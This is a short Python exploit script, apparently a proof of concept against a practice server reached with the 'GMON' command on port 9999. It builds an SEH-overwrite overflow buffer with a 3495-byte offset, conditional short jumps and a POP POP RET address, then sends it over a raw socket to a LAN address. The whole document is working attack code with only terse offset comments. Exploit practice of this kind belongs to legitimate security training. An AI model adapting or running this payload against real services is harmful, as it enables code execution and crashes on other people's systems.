import socket
import os
import sys

host = '192.168.1.15'
port = 9999

# nSEH is at 3495 with 28 bytes of data after

junk = '\x41' * 3495

# JNO SHORT 0x8, JO SHORT 0x6
junk += '\x71\x06\x71\x04'

# POP POP RET at 0x6250195e
junk += '\x5e\x19\x50\x62'

junk += '\x44' * (5000 - len(junk))

sploit = 'GMON /.:/' + junk

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(sploit)
expl.close()
